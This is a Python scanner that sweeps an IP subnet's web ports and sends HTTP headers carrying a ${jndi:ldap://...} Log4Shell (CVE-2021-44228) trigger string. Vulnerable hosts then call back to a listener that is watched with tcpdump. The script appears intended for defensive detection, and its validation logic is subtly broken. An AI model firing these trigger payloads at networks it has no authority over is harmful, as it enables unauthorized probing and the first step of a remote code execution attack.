#!/usr/bin/env python3

"""
Script for quick scan of web ports in IP subnet, trying to provoke log4j vulnerability.
Author: Metodi Davidovic
"""
import argparse
import sys
import socket
import ipaddress
import logging
import requests
import requests.packages.urllib3

VERSION="0.1"
DEFAULT_TARGET_PORTS="80,8080,443,8443"
DEFAULT_LOG="./log4j-quick-scan.log"

def parse_arguments(argv=None):
    """ Define CLI arguments to script. """
    # Create the parser
    argparser = argparse.ArgumentParser(description='Scan hosts with log4j and jndi doing external connections.')
    # Optional and positional group exist, required group will be created (for reorder)
    argparser_required = argparser.add_argument_group('required arguments')
    argparser.add_argument('-V','--version', action='version', version='%(prog)s ' + VERSION, help='Display version and exit.')
    argparser_required.add_argument('-e','--listenhost', type=str, required=True, help='Host[:port] where to monitor tcp connections. It could be the same machine where script is to be run.')
    argparser.add_argument('-p','--ports',type=str, required=False, default=DEFAULT_TARGET_PORTS, help='Optional, comma separated list of ports on tested hosts. Default: ' + DEFAULT_TARGET_PORTS)
    argparser.add_argument('-l','--log',type=str, required=False, default=DEFAULT_LOG, help='Optional, append output to custom log file. Default: ' + DEFAULT_LOG)
    argparser.add_argument('target',type=str, help='Scan target: IP network in CIDR format.')
    groups_order = {'required arguments': 0,'optional arguments': 1, 'positional arguments': 2 }
    argparser._action_groups.sort(key=lambda g: groups_order[g.title])

    return argparser.parse_args(argv)
    

def info(listen_host):
    """ Print explanation """
    print("Script is for quick scan of given IP subnet. It tries to establish HTTP(S) connection to given ports and provoke CVE-2021-44228 (log4shell) vulnerability.")
    print("---")
    print("How to use:")
    print("   1. On listen host (any Linux machine reachable from targets), start tcpdump to catch traffic for any free TCP port.")
    print("      e.g: tcpdump -nn -i ens160 tcp port 12345")
    print("   2. Start this script on Linux machine that is allowed to communicate with target IP network.")
    print("      e.g: ./log4j-quick-scan.py -e 192.168.0.3:12345 192.168.0.0/24")
    print("   3. Script will send HTTP(S) request to every port in port list for every IP address (target) in given IP network.")
    print("      HTTP headers User-Agent, X-Api-Version and X-Forwarded-For are filled with jndi string that will trigger vulnerable log4 library.")
    print("   4. Monitor tcpdump output on listen host. Targets that are suspects for log4shell will try to do JNDI ldap remote lookup to listenhost.")
    print("      Investigate those further, check software's vendor notices etc.")
    print("---")

def create_jndi_string(listen_host):
    """ Compile JNDI string """
    jndi="${jndi:ldap://" + listen_host + "}"
    #jndi="${jndi:dns://" + listen_host + "}" # if for any reason, we need to tcpdump for UDP protocol
    return jndi

def validate_ip_cidr(network2check):
    """ Check argument for network """
    try:
        ipaddress.IPv4Network(network2check['app'])
        return True
    except (ValueError, ipaddress.AddressValueError):
        return False

def prepare_logfile(logfile):
    """ Create log file """
    try:
        logging.basicConfig(filename=logfile, filemode='a', level=logging.INFO, format='%(asctime)s  %(levelname)-8s %(message)s')
    except: # pylint: disable=bare-except
        print("[!] Log file cannot be created.")
        sys.exit(1)
    else:
        logging.getLogger("paramiko").setLevel(logging.ERROR)


def write_log_record(record,level="i"):
    """ Write an event to log file, with severity """
    if level == "i":
        logging.info(record)
    elif level == "w":
        logging.warning(record)
    elif level == "e":
        logging.error(record)
    elif level == "d":
        logging.debug(record)
    else:
        logging.info(record)
    return True

#########################


def main():
    """ Main """

    prepare_logfile("./log4j-quick-scan.log")
    logentry="Script started."
    write_log_record(logentry,"i")

    argvalues=None
    args = parse_arguments(argvalues)
    listen_host=args.listenhost
    target_ports_array=args.ports.split(",")

    # passed argument is ip network (cidr)
    try:
        target_ip_cidr=args.target   
    except: # pylint: disable=bare-except
        logentry="Target IP subnet is not present. Cannot continue."
        print(logentry)
        write_log_record(logentry,"e")
        sys.exit(1)

    # check ip subnet
    if not validate_ip_cidr:
        logentry="IP network is not valid. Exiting."
        print(logentry)
        write_log_record(logentry,"e")
        sys.exit(1)

    info(listen_host)
    
    logentry="Scan for CIDR=" + str(target_ip_cidr) + " is starting...\n\n"
    logentry=logentry + "       ip address  :: hostname    :: [port:response_http_code] ...\n"
    line="       " + "-" * 60
    logentry=logentry + line
    print(logentry)
    write_log_record(logentry,"i")

    # assembly jndi string for various http headers (eg. user agent)
    jndi_string=create_jndi_string(listen_host)
            
    # loop for every IP
    for target_ip in ipaddress.IPv4Network(target_ip_cidr,strict=False):
        try:
            # get hostname from ip (for display only)
            target_hostname=socket.gethostbyaddr(str(target_ip))[0]
        except KeyboardInterrupt:  # catch SIGINT (ctrl + c)
            print("[!] interruption received, stopping....")
            sys.exit(1)
        except: # pylint: disable=bare-except
            target_hostname="<noname>"
            
        logentry=str(target_ip) + " :: " + str(target_hostname) + " :: "
        print("     - " + logentry, end='')

        ports2log=""
        # loop through port list
        for port in target_ports_array:
            # determine is it https or plain http
            if port == "443" or port == "8443":
                protocol="https"
            else:
                protocol="http"

            # concatenate target url
            url=protocol + "://" + str(target_ip) + ":" + str(port)

            # do http request
            try:
                # disable all warnings
                requests.packages.urllib3.disable_warnings()
                # do request
                # User-Agent is commonf for logging in web servers, X-Api-Version is for REST API version
                response = requests.get(url, headers={'User-Agent': jndi_string, 'X-Api-Version': jndi_string, 'X-Forwarded-For': str(target_ip)}, timeout=1, verify=False)
                
                # get status
                response.raise_for_status()
            except KeyboardInterrupt:  # catch SIGINT (ctrl + c)
                print("[!] interruption received, stopping....")
                sys.exit(1)
            except: # pylint: disable=bare-except
                answer=" "
            else:
                answer=" [" + port + ":" + str(response.status_code) + "] "
                
            ports2log=ports2log + answer 
            print(answer, end='')
            # end of port loop

        # write to log: ip :: hostname :: live ports and status codes
        logentry=logentry + ports2log
        write_log_record(logentry,"i")
        print("")
        # end of ip address loop

    logentry="Script finished."
    write_log_record(logentry,"i")

###
if __name__ == '__main__':
    main()
else:
    print("Script cannot be used as module.")
    sys.exit(1)


sys.exit(0)

